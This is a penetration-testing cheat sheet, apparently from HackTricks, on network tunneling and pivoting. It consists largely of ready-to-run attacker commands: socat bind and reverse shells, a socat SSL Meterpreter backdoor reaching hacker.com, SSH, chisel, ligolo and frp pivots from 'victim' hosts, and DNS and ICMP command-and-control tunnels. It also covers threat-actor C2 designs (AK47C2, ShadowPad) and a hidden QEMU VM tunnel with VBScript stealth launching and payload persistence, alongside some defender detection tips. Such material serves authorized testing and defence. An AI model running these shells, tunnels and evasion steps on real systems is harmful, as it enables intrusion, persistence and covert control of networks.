# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap tip

> [!WARNING]
> **ICMP** and **SYN** scans cannot be tunnelled through socks proxies, so we must **disable ping discovery** (`-Pn`) and specify **TCP scans** (`-sT`) for this to work.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

SSH graphical connection (X)

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Local Port2Port

Open new Port in SSH Server --> Other port

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Local port --> Compromised host (SSH) --> Third_box:Port

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Local Port --> Compromised host (SSH) --> Wherever

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Reverse Port Forwarding

This is useful to get reverse shells from internal hosts through a DMZ to your host:

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

You need **root in both devices** (as you are going to create new interfaces) and the sshd config has to allow root login:\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Enable forwarding on the Server side

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Set a new route on the client side

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**  
> The 2023 Terrapin downgrade attack can let a man-in-the-middle tamper with the early SSH handshake and inject data into **any forwarded channel** ( `-L`, `-R`, `-D` ). Ensure both client and server are patched (**OpenSSH ≥ 9.6/LibreSSH 6.7**) or explicitly disable the vulnerable `chacha20-poly1305@openssh.com` and `*-etm@openssh.com` algorithms in `sshd_config`/`ssh_config` before relying on SSH tunnels. 

## SSHUTTLE

You can **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a host.\
For example, forwarding all the traffic going to 10.10.10.0/24

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Connect with a private key

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

### Port2Port

Local port --> Compromised host (active session) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Another way:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

### SOCKS proxy

Open a port in the teamserver listening in all the interfaces that can be used to **route the traffic through the beacon**.

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> In this case, the **port is opened in the beacon host**, not in the Team Server and the traffic is sent to the Team Server and from there to the indicated host:port

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

To note:

- Beacon's reverse port forward is designed to **tunnel traffic to the Team Server, not for relaying between individual machines**.
- Traffic is **tunneled within Beacon's C2 traffic**, including P2P links.
- **Admin privileges are not required** to create reverse port forwards on high ports.

### rPort2Port local

> [!WARNING]
> In this case, the **port is opened in the beacon host**, not in the Team Server and the **traffic is sent to the Cobalt Strike client** (not to the Team Server) and from there to the indicated host:port

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

You need to upload a web file tunnel: ashx|aspx|js|jsp|php|php|jsp

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

You can download it from the releases page of [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
You need to use the **same version for client and server**

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Use the same version for agent and proxy**

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Agent Binding and Listening

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Access Agent's Local Ports

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. The tunnel is started from the victim.\
A socks4 proxy is created on 127.0.0.1:1080

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot through **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port through socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter through SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

You can bypass a **non-authenticated proxy** executing this line instead of the last one in the victim's console:

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Create certificates on both sides: Client and Server

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Connect the local SSH port (22) to the 443 port of the attacker host

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

It's like a console PuTTY version ( the options are very similar to an ssh client).

As this binary will be executed in the victim and it is an ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward only locally accessible port to a port in our machine:

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

You need to be a local admin (for any port)

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

## SocksOverRDP & Proxifier

You need to have **RDP access over the system**.\
Download:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - This tool uses `Dynamic Virtual Channels` (`DVC`) from the Remote Desktop Service feature of Windows. DVC is responsible for **tunneling packets over the RDP connection**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

In your client computer load **`SocksOverRDP-Plugin.dll`** like this:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Now we can **connect** to the **victim** over **RDP** using **`mstsc.exe`**, and we should receive a **prompt** saying that the **SocksOverRDP plugin is enabled**, and it will **listen** on **127.0.0.1:1080**.

**Connect** via **RDP** and upload & execute in the victim machine the `SocksOverRDP-Server.exe` binary:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Now, confirm in you machine (attacker) that the port 1080 is listening:

```
netstat -antb | findstr 1080
```

Now you can use [**Proxifier**](https://www.proxifier.com/) **to proxy the traffic through that port.**

## Proxify Windows GUI Apps

You can make Windows GUI apps navigate through a proxy using [**Proxifier**](https://www.proxifier.com/).\
In **Profile -> Proxy Servers** add the IP and port of the SOCKS server.\
In **Profile -> Proxification Rules** add the name of the program to proxify and the connections to the IPs you want to proxify.

## NTLM proxy bypass

The previously mentioned tool: **Rpivot**\
**OpenVPN** can also bypass it, setting these options in the configuration file:

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

It authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port.\
For example that forward port 443

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Now, if you set for example in the victim the **SSH** service to listen in port 443. You can connect to it through the attacker port 2222.\
You could also use a **meterpreter** that connects to localhost:443 and the attacker is listening in port 2222.

## YARP

A reverse proxy created by Microsoft. You can find it here: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root is needed in both systems to create tun adapters and tunnel data between them using DNS queries.

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

The tunnel will be very slow. You can create a compressed SSH connection through this tunnel by using:

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

Establishes a C\&C channel through DNS. It doesn't need root privileges.

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **In PowerShell**

You can use [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) to run a dnscat2 client in powershell:

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Port forwarding with dnscat**

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Change proxychains DNS

Proxychains intercepts `gethostbyname` libc call and tunnels tcp DNS request through the socks proxy. By **default** the **DNS** server that proxychains use is **4.2.2.2** (hardcoded). To change it, edit the file: _/usr/lib/proxychains3/proxyresolv_ and change the IP. If you are in a **Windows environment** you could set the IP of the **domain controller**.

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

The Storm-2603 actor created a **dual-channel C2 ("AK47C2")** that abuses *only* outbound **DNS** and **plain HTTP POST** traffic – two protocols that are rarely blocked on corporate networks.

1. **DNS mode (AK47DNS)**
   • Generates a random 5-character SessionID (e.g. `H4T14`).  
   • Prepends `1` for *task requests* or `2` for *results* and concatenates different fields (flags, SessionID, computer name).  
   • Each field is **XOR-encrypted with the ASCII key `VHBD@H`**, hex-encoded, and glued together with dots – finally ending with the attacker-controlled domain:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Requests use `DnsQuery()` for **TXT** (and fallback **MG**) records.  
   • When the response exceeds 0xFF bytes the backdoor **fragments** the data into 63-byte pieces and inserts the markers:
     `s<SessionID>t<TOTAL>p<POS>` so the C2 server can reorder them.

2. **HTTP mode (AK47HTTP)**
   • Builds a JSON envelope:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • The whole blob is XOR-`VHBD@H` → hex → sent as the body of a **`POST /`** with header `Content-Type: text/plain`.
   • The reply follows the same encoding and the `cmd` field is executed with `cmd.exe /c <command> 2>&1`.

Blue Team notes
• Look for unusual **TXT queries** whose first label is long hexadecimal and always end in one rare domain.  
• A constant XOR key followed by ASCII-hex is easy to detect with YARA: `6?56484244?484` (`VHBD@H` in hex).  
• For HTTP, flag text/plain POST bodies that are pure hex and multiple of two bytes.

{{#note}}
The entire channel fits inside **standard RFC-compliant queries** and keeps each sub-domain label under 63 bytes, making it stealthy in most DNS logs.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root is needed in both systems to create tun adapters and tunnel data between them using ICMP echo requests.

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Download it from here**](https://github.com/utoni/ptunnel-ng.git).

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) **is a tool to expose solutions to Internet in one command line.**\
_Exposition URI are like:_ **UID.ngrok.io**

### Installation

- Create an account: https://ngrok.com/signup
- Client download:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Basic usages

**Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_It is also possible to add authentication and TLS, if necessary._

#### Tunneling TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Exposing files with HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing HTTP calls

_Useful for XSS,SSRF,SSTI ..._\
Directly from stdout or in the HTTP interface [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling internal HTTP service

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### ngrok.yaml simple configuration example

It opens 3 tunnels:

- 2 TCP
- 1 HTTP with static files exposition from /tmp/httpbin/

```yaml
tunnels:
  mytcp:
    addr: 4444
    proto: tcptunne
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Cloudflared (Cloudflare Tunnel)

Cloudflare’s `cloudflared` daemon can create outbound tunnels that expose **local TCP/UDP services** without requiring inbound firewall rules, using Cloudflare’s edge as the rendez-vous point. This is very handy when the egress firewall only allows HTTPS traffic but inbound connections are blocked.

### Quick tunnel one-liner

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5 pivot

```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```

### Persistent tunnels with DNS

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Start the connector:

```bash
cloudflared tunnel run mytunnel
```

Because all traffic leaves the host **outbound over 443**, Cloudflared tunnels are a simple way to bypass ingress ACLs or NAT boundaries. Be aware that the binary usually runs with elevated privileges – use containers or the `--user` flag when possible. 

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) is an actively-maintained Go reverse-proxy that supports **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. Starting with **v0.53.0 (May 2024)** it can act as an **SSH Tunnel Gateway**, so a target host can spin up a reverse tunnel using only the stock OpenSSH client – no extra binary required.

### Classic reverse TCP tunnel

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Using the new SSH gateway (no frpc binary)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

The above command publishes the victim’s port **8080** as **attacker_ip:9000** without deploying any additional tooling – ideal for living-off-the-land pivoting. 

## Covert VM-based Tunnels with QEMU

QEMU’s user-mode networking (`-netdev user`) supports an option called `hostfwd` that **binds a TCP/UDP port on the *host* and forwards it into the *guest***.  When the guest runs a full SSH daemon, the hostfwd rule gives you a disposable SSH jump box that lives entirely inside an ephemeral VM – perfect for hiding C2 traffic from EDR because all malicious activity and files stay in the virtual disk.

### Quick one-liner

```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• The command above launches a **Tiny Core Linux** image (`tc.qcow2`) in RAM.  
• Port **2222/tcp** on the Windows host is transparently forwarded to **22/tcp** inside the guest.  
• From the attacker’s point of view the target simply exposes port 2222; any packets that reach it are handled by the SSH server running in the VM.

### Launching stealthily through VBScript

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Running the script with `cscript.exe //B update.vbs` keeps the window hidden.

### In-guest persistence

Because Tiny Core is stateless, attackers usually:

1. Drop payload to `/opt/123.out`  
2. Append to `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Add `home/tc` and `opt` to `/opt/filetool.lst` so the payload is packed into `mydata.tgz` on shutdown.

### Why this evades detection

• Only two unsigned executables (`qemu-system-*.exe`) touch disk; no drivers or services are installed.  
• Security products on the host see **benign loopback traffic** (the actual C2 terminates inside the VM).  
• Memory scanners never analyse the malicious process space because it lives in a different OS.

### Defender tips

• Alert on **unexpected QEMU/VirtualBox/KVM binaries** in user-writable paths.  
• Block outbound connections that originate from `qemu-system*.exe`.  
• Hunt for rare listening ports (2222, 10022, …) binding immediately after a QEMU launch.

## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)

Ink Dragon’s ShadowPad IIS module turns every compromised perimeter web server into a dual-purpose **backdoor + relay** by binding covert URL prefixes directly at the HTTP.sys layer:

* **Config defaults** – if the module’s JSON config omits values, it falls back to believable IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). That way benign traffic is answered by IIS with the correct branding.
* **Wildcard interception** – operators supply a semicolon-separated list of URL prefixes (wildcards in host + path). The module calls `HttpAddUrl` for each entry, so HTTP.sys routes matching requests to the malicious handler *before* the request reaches IIS modules.
* **Encrypted first packet** – the first two bytes of the request body carry the seed for a custom 32-bit PRNG. Every subsequent byte is XOR-ed with the generated keystream before protocol parsing:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Relay orchestration** – the module maintains two lists: “servers” (upstream nodes) and “clients” (downstream implants). Entries are pruned if no heartbeat arrives within ~30 seconds. When both lists are non-empty, it pairs the first healthy server with the first healthy client and simply pipes bytes between their sockets until one side closes.
* **Debug telemetry** – optional logging records source IP, destination IP, and total forwarded bytes for each pairing. Investigators used those breadcrumbs to rebuild the ShadowPad mesh spanning multiple victims.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}


